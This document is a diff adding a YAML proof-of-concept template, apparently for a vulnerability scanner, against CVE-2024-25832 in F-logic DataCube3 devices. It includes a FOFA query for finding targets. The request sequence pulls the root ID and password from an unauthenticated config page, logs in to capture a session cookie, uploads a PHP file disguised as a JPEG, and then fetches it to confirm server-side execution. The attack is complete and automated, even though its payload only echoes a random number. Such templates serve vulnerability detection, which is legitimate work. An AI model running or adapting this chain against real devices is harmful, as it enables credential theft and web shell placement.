@@ -1,0 +1,68 @@
+id: poc-yaml-f-logic-datacube3-anyfile-upload
+info:
+  name: F-logic DataCube3 任意文件上传漏洞(CVE-2024-25832)
+  severity: critical
+  tags:
+  - 文件上传
+  - CVE-2024-25832
+  finger: datacube3
+  fofa: title=="DataCube3"
+variables:
+  t1: random_str(4)
+  t2: random_int(1000,10000)
+requests:
+- method: GET
+  path: /admin/config_all.php
+  expression: status_code == 302
+  output:
+  - regex_match(body,`"login.root_pwd","value":"(?P<password>[0-9a-zA-Z-]+)`)
+  - regex_match(body,`login.root_id","value":"(?P<id>[a-z]+)`)
+- method: POST
+  path: /admin/config_all.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: user_id={{.id}}&user_pw={{.password}}&login=%25E3%2583%25AD%25E3%2582%25B0%25E3%2582%25A4%25E3%2583%25B3
+  expression: status_code == 302
+  output:
+  - regex_match(headers,`SESS_IDS=(?P<cookie>[a-z0-9A-Z]+);`)
+- method: GET
+  path: /admin/setting_photo.php
+  headers:
+    Cookie: SESS_IDS={{.cookie}}
+  expression: status_code == 302
+  output:
+  - regex_match(body,`name="accesstime" value="(?P<accesstime>.*?)"`)
+- method: POST
+  path: /admin/setting_photo.php
+  headers:
+    Content-Type: multipart/form-data;boundary=---------------------------113389720123090127612523184396
+    Cookie: SESS_IDS={{.cookie}}
+  data: '-----------------------------113389720123090127612523184396
+
+    Content-Disposition: form-data; name="add"
+
+
+    .............................
+
+    -----------------------------113389720123090127612523184396
+
+    Content-Disposition: form-data; name="addPhoto"; filename="{{.t1}}.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php echo {{.t2}};?>
+
+    -----------------------------113389720123090127612523184396
+
+    Content-Disposition: form-data; name="accesstime"
+
+
+    {{.accesstime}}
+
+    -----------------------------113389720123090127612523184396--'
+  expression: status_code == 302
+- method: GET
+  path: /images/slideshow/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
